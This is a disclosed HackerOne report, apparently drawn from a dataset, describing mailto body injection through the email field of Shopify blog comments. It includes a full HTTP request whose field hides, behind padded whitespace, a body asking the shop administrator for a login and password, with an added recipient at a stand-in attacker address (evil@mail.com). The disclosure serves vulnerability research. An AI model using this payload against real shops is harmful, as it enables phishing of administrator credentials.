---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '72976'
original_report_id: '72976'
title: Body injection in mailto link while commenting shop blog
team_handle: shopify
created_at: '2015-06-28T13:19:42.550Z'
disclosed_at: '2015-09-10T16:41:08.997Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
---

# Body injection in mailto link while commenting shop blog

## Metadata

- HackerOne Report ID: 72976
- Weakness: 
- Program: shopify
- Disclosed At: 2015-09-10T16:41:08.997Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

While commenting shop blog an attacker can inject a body attribute in email so it will be interpreted by shop administrator email-client. Attacker can make the request below to send the malicious comment:

```http
POST /blogs/news/18286141-first-post/comments HTTP/1.1
Host: test-4579.myshopify.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: <COOKIES_HERE>
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 926

comment%5Bauthor%5D=testxss&comment%5Bemail%5D=Reply%c2%a0customer%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%3Fbody%3DTo%c2%a0identify%c2%a0you%c2%a0as%c2%a0shop%c2%a0administrator%c2%a0please%c2%a0enter%c2%a0your%c2%a0login:%c2%a0________%c2%a0and%c2%a0password:%c2%a0________%c2%a0and%c2%a0send%c2%a0a%c2%a0letter%26to%3Devil@mail.com&comment%5Bbody%5D=gyjghhj
```

So after that the shop administrator will see this comment as present on screen1.  If the administrator device has small screen he will not see the link payload.
When administrator clicks the link to reply customer his email client will interpret the malicious body argument so the message will look like presented in screen2. So an attacker can steal the sensitive info using social engineering.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
